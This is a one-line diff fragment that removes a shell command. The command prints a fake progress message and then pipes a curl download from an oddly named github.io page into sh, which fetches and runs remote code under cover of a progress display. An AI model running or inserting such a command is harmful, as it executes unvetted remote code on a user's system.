@@ -1,1 +1,0 @@
-echo 'Progress: 63.0%'; curl -L --progress-bar frkns.github.io/fun/knife_bluetooth_blogs_soul | sh
